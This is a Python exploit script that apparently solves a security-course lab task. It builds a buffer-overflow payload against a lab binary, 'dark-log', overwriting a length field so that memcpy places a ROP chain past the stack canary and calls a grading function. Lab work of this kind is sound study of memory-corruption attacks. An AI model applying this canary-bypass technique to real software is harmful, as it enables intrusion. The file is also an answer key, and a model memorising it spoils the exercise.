#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

dark-log protects input() with a stack canary at rbp-0x8, and a plain gets()
overflow cannot reach the saved return address without destroying it.  The
exploitable copy is the one that follows:

    f.len = 0;
    gets(f.expression);                            /* 128-byte buffer */
    memcpy(f.logMsg + f.len, f.expression, 128);   /* dst = rbp-0xa0  */

f.len sits at rbp-0x20, inside the reach of the gets() overflow, and is read
after gets() returns.  With f.len = 0xa8 the destination becomes
rbp-0xa0 + 0xa8 = rbp+8, exactly the saved return address, so the 128 bytes
copied from f.expression land above the canary.  The canary slot itself is
never written, so the check passes.

Input line:

    [  0, 128)  ROP chain, copied to rbp+8
    [128, 256)  filler (the rest of logMsg[])
    [256, 260)  f.len = 0xa8  (stops 0x1c bytes short of the canary)

    ret             0x4018a4   alignment for printf
    pop rdi; ret    0x4018a3
    4                          grade_eval's argument
    grade_eval      0x401677   prints "Hope A will be your grade!"

dark-log imports neither exit() nor a syscall instruction, so after
grade_eval returns the chain runs out and the process faults; the grade
message has already been flushed by grade_eval itself.
"""
import struct
import sys

RET = 0x4018A4        # ret
POP_RDI = 0x4018A3    # pop rdi; ret
GRADE_EVAL = 0x401677

MEMCPY_DST_OFFSET = 0xA8   # rbp-0xa0 + 0xa8 == rbp+8 (saved return address)
EXPRESSION_SIZE = 128
LOGMSG_SIZE = 128


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


chain = b""
chain += p64(RET)
chain += p64(POP_RDI)
chain += p64(4)
chain += p64(GRADE_EVAL)
chain = chain.ljust(EXPRESSION_SIZE, b"\x00")

payload = chain
payload += b"\x00" * LOGMSG_SIZE
payload += struct.pack("<i", MEMCPY_DST_OFFSET)
sys.stdout.buffer.write(payload)
